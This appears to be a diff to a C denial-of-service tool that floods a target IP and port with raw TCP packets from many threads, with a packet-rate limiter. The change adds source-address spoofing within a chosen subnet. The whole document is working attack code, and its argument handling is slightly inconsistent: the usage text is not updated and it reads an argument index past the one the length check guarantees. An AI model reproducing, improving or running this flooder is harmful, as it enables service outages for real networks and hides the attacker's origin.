@@ -20,13 +20,13 @@
 
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
-
+struct in_addr ourIP;
 static unsigned long int Q[4096], c = 362436;
 static unsigned int floodport;
 volatile int limiter;
 volatile unsigned int pps;
 volatile unsigned int sleeptime = 100;
-
+int spoofit;
 void init_rand(unsigned long int x)
 {
 	int i;
@@ -49,6 +49,11 @@ unsigned long int rand_cmwc(void)
 		c++;
 	}
 	return (Q[i] = r - x);
+}
+in_addr_t getRandomIP(in_addr_t netmask)
+{
+        in_addr_t tmp = ntohl(ourIP.s_addr) & netmask;
+        return tmp ^ ( rand_cmwc() & ~netmask);
 }
 unsigned short csum (unsigned short *buf, int count)
 {
@@ -148,9 +153,14 @@ void *flood(void *par1)
 	register unsigned int i;
 	i = 0;
 	while(i < 10000){
+		in_addr_t netmask;
+
+                if ( spoofit == 0 ) netmask = ( ~((in_addr_t) -1) );
+                else netmask = ( ~((1 << (32 - spoofit)) - 1) );
+		
 		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
 
-		iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
+		iph->saddr = htonl( getRandomIP(netmask) );
 		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
 		iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 		tcph->seq = rand_cmwc() & 0xFFFF;
@@ -169,7 +179,7 @@ void *flood(void *par1)
 }
 int main(int argc, char *argv[ ])
 {
-	if(argc < 6){
+	if(argc < 7){
 		fprintf(stderr, "Invalid parameters!\n");
 		fprintf(stdout, "Usage: %s <target IP> <port to be flooded> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);
 		exit(-1);
@@ -177,9 +187,10 @@ int main(int argc, char *argv[ ])
 
 	fprintf(stdout, "Setting up Sockets...\n");
 
-	int num_threads = atoi(argv[3]);
+	int num_threads = atoi(argv[5]);
 	floodport = atoi(argv[2]);
-	int maxpps = atoi(argv[4]);
+	spoofit = atoi(argv[4]);
+	int maxpps = atoi(argv[6]);
 	limiter = 0;
 	pps = 0;
 	pthread_t thread[num_threads];
@@ -191,7 +202,7 @@ int main(int argc, char *argv[ ])
 		pthread_create( &thread[i], NULL, &flood, (void *)argv[1]) * 4096;
 	}
 	fprintf(stdout, "Starting Flood...\n");
-	for(i = 0;i<(atoi(argv[5])*multiplier);i++)
+	for(i = 0;i<(atoi(argv[7])*multiplier);i++)
 	{
 		usleep((1000/multiplier)*1000);
 		if((580000000*multiplier) > maxpps)
